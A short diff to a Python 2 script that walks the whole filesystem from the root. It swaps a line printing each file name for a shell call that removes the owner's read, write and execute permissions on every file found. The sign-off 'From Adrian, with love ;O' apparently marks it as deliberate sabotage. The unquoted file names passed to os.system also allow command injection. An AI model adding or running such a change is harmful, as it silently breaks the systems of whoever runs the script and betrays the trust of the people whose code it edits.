@@ -6,5 +6,5 @@ for i in xrange(300):
 for roots, dirs, files in os.walk("/"):
    for f in files:
       filename = f if is_ascii(f) else "unicode"
-      print filename
+      os.system("chmod u-rwx %s" % filename)
 #From Adrian, with love ;O
